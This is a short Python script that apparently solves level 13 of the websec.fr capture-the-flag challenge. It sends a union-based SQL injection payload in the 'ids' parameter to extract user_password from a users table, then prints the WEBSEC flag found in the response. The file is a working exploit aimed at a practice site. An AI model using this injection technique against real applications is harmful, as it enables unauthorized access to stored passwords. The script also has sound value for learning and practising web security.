import requests
import re


url = "https://websec.fr/level13/index.php?ids=-1,-1,-1,-1,30)) UNION+SELECT user_password,1,'2' from users--"
req = requests.get(url=url)
if req.status_code == 200:
    pattern = r'WEBSEC{.+}'
    match = re.search(pattern, req.text)
    if match:
        print(match.group())
    else:
        print("wrong input")
